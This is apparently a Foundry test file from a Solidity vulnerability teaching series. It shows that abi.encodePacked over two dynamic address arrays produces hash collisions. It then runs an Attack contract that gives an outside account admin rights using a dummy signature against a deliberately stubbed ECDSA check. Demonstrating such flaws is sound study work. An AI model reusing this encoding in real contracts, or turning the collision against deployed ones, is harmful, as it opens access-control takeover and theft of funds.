pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/8.3.4-Incorrect-Argument-Encoding-vulnerability.sol";

contract VulnerableAccessControlTest is Test {
    VulnerableAccessControl vulnerable;
    Attack attack;
    
    // This is the fixed address returned by our simplified ECDSA.recover
    address constant recoveredAdmin = 0x1234567890123456789012345678901234567890;

    function setUp() public {
        // Deploy the vulnerable contract. Deployer becomes an admin.
        vulnerable = new VulnerableAccessControl();
        
        // Since our ECDSA.recover always returns recoveredAdmin,
        // ensure that recoveredAdmin is marked as admin so that signature checks pass.
        address[] memory adminsToAdd = new address[](1);
        adminsToAdd[0] = recoveredAdmin;
        address[] memory emptyRegularUsers = new address[](0);
        // As deployer is admin, signature is not checked.
        vulnerable.addUsers(adminsToAdd, emptyRegularUsers, "");
        
        // Deploy the attack contract pointing to the vulnerable contract.
        attack = new Attack(vulnerable);
    }

    function testHashCollision() public {
        // This test demonstrates that due to using abi.encodePacked for dynamic arrays, two different sets of inputs
        // can lead to the same hash value.
        
        // Combination one: admins = [0x1111111111111111111111111111111111111111],
        // regularUsers = [0x2222222222222222222222222222222222222222, 0x3333333333333333333333333333333333333333]
        address[] memory admins1 = new address[](1);
        admins1[0] = 0x1111111111111111111111111111111111111111;
        address[] memory regularUsers1 = new address[](2);
        regularUsers1[0] = 0x2222222222222222222222222222222222222222;
        regularUsers1[1] = 0x3333333333333333333333333333333333333333;

        // Combination two: admins = [0x1111111111111111111111111111111111111111, 0x2222222222222222222222222222222222222222],
        // regularUsers = [0x3333333333333333333333333333333333333333]
        address[] memory admins2 = new address[](2);
        admins2[0] = 0x1111111111111111111111111111111111111111;
        admins2[1] = 0x2222222222222222222222222222222222222222;
        address[] memory regularUsers2 = new address[](1);
        regularUsers2[0] = 0x3333333333333333333333333333333333333333;

        bytes32 hash1 = keccak256(abi.encodePacked(admins1, regularUsers1));
        bytes32 hash2 = keccak256(abi.encodePacked(admins2, regularUsers2));

        // The vulnerability arises because the encoding of dynamic arrays without length information
        // can cause collisions. We check that these two different inputs produce the same hash.
        assertEq(uint256(hash1), uint256(hash2), "Hashes should collide due to incorrect argument encoding.");
    }

    function testExploitAttack() public {
        // In this test, an attacker that is not an admin uses the exploit via the Attack contract
        // to bypass the signature verification, taking advantage of the hash collision vulnerability.
        
        // Simulate an attacker EOA (e.g., address 0x1).
        address attackerEOA = address(0x1);
        vm.prank(attackerEOA);
        
        // Craft a dummy signature of correct length (65 bytes). The content doesn't matter because our ECDSA.recover
        // implementation only checks the length and then returns recoveredAdmin.
        bytes memory dummySig = new bytes(65);
        for (uint256 i = 0; i < 65; i++) {
            dummySig[i] = bytes1(0);
        }
        
        // The Attack contract's performAttack constructs parameters intended to collide with a legitimate signed payload.
        // It passes msg.sender (the attackerEOA) as the admin to be added.
        // Because the signature check recovers recoveredAdmin (which we set as admin in setUp), the check passes,
        // and the vulnerable contract then sets isAdmin[attackerEOA] = true.
        attack.performAttack(dummySig);
        
        // Verify that the attacker is now an admin according to the vulnerable contract.
        assertTrue(vulnerable.isAdmin(attackerEOA), "Attacker should now be admin due to exploit.");
    }
}
